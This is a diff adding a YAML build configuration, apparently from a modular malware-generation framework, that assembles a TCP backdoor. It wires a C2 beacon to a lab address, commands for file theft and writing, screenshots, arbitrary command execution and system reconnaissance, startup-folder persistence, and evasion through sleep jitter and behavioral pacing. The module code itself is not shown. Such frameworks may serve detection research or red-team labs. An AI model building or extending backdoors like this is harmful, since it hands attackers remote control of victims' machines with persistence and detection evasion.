@@ -1,0 +1,31 @@
+name: backdoor_tcp_persist_startup
+description: TCP backdoor — mixed API+LOLBin commands, startup folder persistence
+
+core:
+  - core/emit_buffer
+  - core/file_ops
+  - core/run_cmd
+
+c2: c2/tcp_beacon
+
+commands:
+  - commands/cmd_sysinfo
+  - commands/cmd_processes
+  - commands/cmd_filelist
+  - commands/cmd_fileread
+  - commands/cmd_filewrite
+  - commands/cmd_screenshot
+  - commands/cmd_exec
+  - commands/cmd_netinfo_lolbin
+
+arch: arch/backdoor
+persist: persist/startup_folder
+
+evasion:
+  - evasion/behavioral_pacing
+  - evasion/sleep_jitter
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  BEACON_INTERVAL_MS: "30000"
